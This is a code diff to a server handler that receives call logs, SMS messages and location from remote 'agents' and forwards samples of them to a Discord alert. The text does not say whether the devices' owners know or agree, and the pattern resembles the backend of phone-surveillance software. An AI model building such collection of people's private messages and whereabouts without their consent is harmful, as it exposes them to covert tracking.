@@ -124,19 +124,49 @@ class AlertAPI:
         valid, agent_id = self._check_auth(request)
 
         if not valid:
-            return web.json_response({"error": "Unauthorized"}, status=401)
+            return web.json_response(
+                {"error": "Unauthorized"},
+                status=401
+            )
 
         try:
             data = await request.json()
         except Exception:
-            return web.json_response({"error": "Invalid JSON"}, status=400)
+            return web.json_response(
+                {"error": "Invalid JSON"},
+                status=400
+            )
 
         calls = data.get("calls", [])
         sms = data.get("sms", [])
         location = data.get("location", {})
 
-        logger.info("Agent %s data received: calls=%d sms=%d location=%s",
-                    agent_id, len(calls), len(sms), location)
+        logger.info(
+            "Agent %s data received: calls=%d sms=%d location=%s",
+            agent_id,
+            len(calls),
+            len(sms),
+            location
+        )
+
+        payload = {
+            "title": "📱 Mobile Data Report",
+            "description": (
+                f"📞 Calls received: {len(calls)}\n"
+                f"💬 SMS received: {len(sms)}"
+            ),
+            "severity": "HIGH",
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "details": {
+                "location": location,
+                "calls": calls[:5],
+                "sms": sms[:5]
+            },
+            "agent_id": agent_id,
+            "device_info": {}
+        }
+
+        await self._send_discord_alert(payload)
 
         return web.json_response({
             "status": "received",
